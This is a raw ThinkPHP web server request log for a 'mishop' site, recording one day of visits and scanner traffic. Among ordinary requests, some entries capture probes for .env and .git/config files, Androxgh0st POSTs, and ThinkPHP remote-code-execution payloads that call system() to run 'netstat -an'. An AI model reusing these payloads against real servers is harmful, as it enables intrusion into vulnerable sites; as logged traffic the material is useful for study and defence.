---------------------------------------------------------------

[2020-12-02T00:58:03+08:00] 47.100.228.127 GET mishop.holyzq.com/
[运行时间：0.004307s] [吞吐率：232.18req/s] [内存消耗：861.62kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'mishop.holyzq.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T02:41:58+08:00] 178.128.181.136 GET 101.132.45.200/.env
[运行时间：0.003179s] [吞吐率：314.56req/s] [内存消耗：522.77kb] [文件加载：109]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-12-02T02:42:00+08:00] 178.128.181.136 POST 101.132.45.200/
[运行时间：0.003824s] [吞吐率：261.51req/s] [内存消耗：862.08kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '20',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
  'host' => '101.132.45.200',
)
[ info ] [ PARAM ] array (
  '0x' => 
  array (
    0 => 'androxgh0st',
  ),
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T03:43:03+08:00] 178.128.181.136 GET 101.132.45.200/.env
[运行时间：0.003798s] [吞吐率：263.30req/s] [内存消耗：522.77kb] [文件加载：109]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-12-02T03:43:05+08:00] 178.128.181.136 POST 101.132.45.200/
[运行时间：0.003814s] [吞吐率：262.19req/s] [内存消耗：862.08kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '20',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
  'host' => '101.132.45.200',
)
[ info ] [ PARAM ] array (
  '0x' => 
  array (
    0 => 'androxgh0st',
  ),
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T07:03:56+08:00] 192.35.168.16 GET 101.132.45.200/
[运行时间：0.004360s] [吞吐率：229.36req/s] [内存消耗：861.39kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '101.132.45.200',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T07:40:21+08:00] 45.153.203.175 GET 101.132.45.200:443/
[运行时间：0.004374s] [吞吐率：228.62req/s] [内存消耗：864.21kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'connection' => 'close',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'en-GB,en;q=0.5',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
  'host' => '101.132.45.200:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T11:06:45+08:00] 47.97.66.35 GET 101.132.45.200/index.php/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=system&vars%5B1%5D=netstat%20-an
[运行时间：0.003203s] [吞吐率：312.22req/s] [内存消耗：520.71kb] [文件加载：108]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-12-02T11:06:45+08:00] 47.97.66.35 GET 101.132.45.200/index.php/?s=/user/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=system&vars%5B1%5D=netstat%20-an
[运行时间：0.002341s] [吞吐率：427.16req/s] [内存消耗：520.71kb] [文件加载：108]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-12-02T11:06:45+08:00] 47.97.66.35 GET 101.132.45.200/index.php/?s=/admin/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=system&vars%5B1%5D=netstat%20-an
[运行时间：0.002422s] [吞吐率：412.91req/s] [内存消耗：520.71kb] [文件加载：108]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-12-02T11:06:45+08:00] 47.97.66.35 GET 101.132.45.200/index.php/?s=/install/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=system&vars%5B1%5D=netstat%20-an
[运行时间：0.002351s] [吞吐率：425.34req/s] [内存消耗：520.72kb] [文件加载：108]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-12-02T11:09:56+08:00] 192.241.237.193 GET 101.132.45.200/actuator/health
[运行时间：0.003371s] [吞吐率：296.65req/s] [内存消耗：522.78kb] [文件加载：109]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-12-02T11:19:13+08:00] 104.236.1.85 GET mishop.holyzq.com/
[运行时间：0.004638s] [吞吐率：215.61req/s] [内存消耗：864.13kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-language' => 'en-gb,en;q=0.5',
  'accept' => 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
  'accept-encoding' => 'identity',
  'user-agent' => 'Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)',
  'accept-charset' => 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T11:27:28+08:00] 83.97.20.30 GET 101.132.45.200:443/
[运行时间：0.004442s] [吞吐率：225.13req/s] [内存消耗：860.38kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => '101.132.45.200:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T11:33:44+08:00] 116.62.107.116 POST 101.132.45.200/
[运行时间：0.004324s] [吞吐率：231.27req/s] [内存消耗：863.41kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '59',
  'content-type' => 'application/x-www-form-urlencoded',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.6.2333.33 Safari/537.36 AliyunTaiShiGanZhi https://www.aliyun.com/product/sas',
  'host' => '101.132.45.200',
)
[ info ] [ PARAM ] array (
  's' => 'netstat -an',
  'filter' => 
  array (
    0 => 'system',
  ),
  'method' => '',
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T11:33:44+08:00] 116.62.107.116 POST 101.132.45.200/index.php?s=captcha
[运行时间：0.002330s] [吞吐率：429.22req/s] [内存消耗：522.08kb] [文件加载：109]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-12-02T11:33:44+08:00] 116.62.107.116 POST 101.132.45.200/
[运行时间：0.003008s] [吞吐率：332.46req/s] [内存消耗：864.44kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '41',
  'cookie' => 'PHPSESSID=pig0nkgvr471ahuh5blu9t3v09',
  'content-type' => 'application/x-www-form-urlencoded',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.6.2333.33 Safari/537.36 AliyunTaiShiGanZhi https://www.aliyun.com/product/sas',
  'host' => '101.132.45.200',
)
[ info ] [ PARAM ] array (
  'c' => 'system',
  'f' => 'netstat -an',
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T11:56:10+08:00] 106.15.52.246 GET /
[运行时间：0.004431s] [吞吐率：225.68req/s] [内存消耗：859.20kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T12:47:23+08:00] 101.132.111.175 GET mishop.holyzq.com/
[运行时间：0.004422s] [吞吐率：226.14req/s] [内存消耗：861.63kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'mishop.holyzq.com',
  'user-agent' => 'Mozilla/5.0 chrome(windows nt/Windows NT;)Chrome',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T12:51:39+08:00] 178.128.194.144 GET 101.132.45.200/.git/config
[运行时间：0.003221s] [吞吐率：310.46req/s] [内存消耗：522.78kb] [文件加载：109]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-12-02T13:04:49+08:00] 47.98.103.48 GET mishop.holyzq.com/
[运行时间：0.004441s] [吞吐率：225.17req/s] [内存消耗：861.63kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'mishop.holyzq.com',
  'user-agent' => 'Mozilla/5.0 chrome(windows nt/Windows NT;)Chrome',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T13:52:35+08:00] 103.149.192.126 GET 101.132.45.200/
[运行时间：0.004518s] [吞吐率：221.34req/s] [内存消耗：861.73kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
  'host' => '101.132.45.200',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T14:03:10+08:00] 184.105.139.67 GET 101.132.45.200/
[运行时间：0.004406s] [吞吐率：226.96req/s] [内存消耗：859.82kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '101.132.45.200',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T14:12:05+08:00] 47.100.130.114 GET /
[运行时间：0.004476s] [吞吐率：223.41req/s] [内存消耗：859.20kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T15:43:52+08:00] 134.209.252.145 GET 101.132.45.200/%ff
[运行时间：0.003253s] [吞吐率：307.41req/s] [内存消耗：522.77kb] [文件加载：109]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-12-02T17:18:50+08:00] 47.101.189.57 GET www.techbimu.com/
[运行时间：0.004324s] [吞吐率：231.27req/s] [内存消耗：861.63kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'www.techbimu.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T18:09:05+08:00] 47.101.197.133 GET 101.132.45.200/
[运行时间：0.004560s] [吞吐率：219.30req/s] [内存消耗：861.63kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => '101.132.45.200',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-12-02T18:29:17+08:00] 106.15.201.70 GET mishop.holyzq.com/
[运行时间：0.004223s] [吞吐率：236.79req/s] [内存消耗：861.63kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'mishop.holyzq.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
